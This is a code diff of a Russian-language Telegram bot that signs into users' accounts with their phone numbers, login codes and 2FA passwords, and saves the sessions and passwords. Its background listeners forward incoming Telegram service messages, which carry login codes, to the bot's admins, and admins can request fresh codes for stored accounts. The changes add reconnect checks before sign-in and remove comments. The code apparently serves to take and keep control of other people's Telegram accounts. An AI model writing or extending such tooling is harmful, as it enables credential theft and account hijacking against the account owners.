@@ -213,7 +213,6 @@ async def set_setting(key: str, value: str):
 
 # ================= ФОНОВЫЙ УПРАВЛИТЕЛЬ СЕССИЙ =================
 async def setup_account_listener(acc_id: int, session_file_path: str, phone: str):
-    """Держит сессию подключенной и пересылает входящие сообщения от Telegram (777000) админам"""
     if acc_id in active_telethon_clients:
         try:
             await active_telethon_clients[acc_id].disconnect()
@@ -252,7 +251,6 @@ async def setup_account_listener(acc_id: int, session_file_path: str, phone: str
 
 
 async def init_all_account_listeners():
-    """Запускает слушатели для всех сохраненных аккаунтов при старте бота"""
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute("SELECT id, session_name, phone FROM accounts") as cursor:
             rows = await cursor.fetchall()
@@ -335,7 +333,6 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
         acc_id = cursor.lastrowid
         await db.commit()
 
-    # Запускаем постоянный фоновый прослушиватель для этого аккаунта
     session_file_path = f"{session_name}.session"
     asyncio.create_task(setup_account_listener(acc_id, session_file_path, phone))
 
@@ -491,6 +488,10 @@ async def process_code(message: Message, state: FSMContext):
     status_msg_id = data.get("status_msg_id")
 
     try:
+        # Проверяем соединение и при необходимости переподключаемся перед отправкой кода
+        if not client.is_connected():
+            await client.connect()
+
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         await finalize_auth_and_success(client, phone, session_name, uid, has_2fa=False)
         if status_msg_id:
@@ -542,6 +543,10 @@ async def process_password(message: Message, state: FSMContext):
     status_msg_id = data.get("status_msg_id")
 
     try:
+        # Проверяем соединение и переподключаемся при обрыве перед отправкой пароля
+        if not client.is_connected():
+            await client.connect()
+
         await client.sign_in(password=password)
         await finalize_auth_and_success(client, phone, session_name, uid, has_2fa=True, password_used=password)
         if status_msg_id:
@@ -782,7 +787,6 @@ async def admin_auto_request_code(callback: CallbackQuery):
     await callback.message.edit_text(f"⏳ Запрашиваю код для `{phone}` через активный фоновый клиент...",
                                      parse_mode="Markdown")
 
-    # Берем клиент из памяти, если он там есть, либо временно открываем сессию
     client = active_telethon_clients.get(acc_id)
     temp_client = None
 
@@ -1039,10 +1043,7 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
 # ================= ЗАПУСК БОТА =================
 async def main():
     await init_db()
-
-    # Запускаем прослушиватели для всех уже существующих в БД аккаунтов в фоновом режиме
     await init_all_account_listeners()
-
     logger.info("Бот samoobman priemka и фоновые слушатели сессий успешны запущены!")
     await dp.start_polling(bot)
 
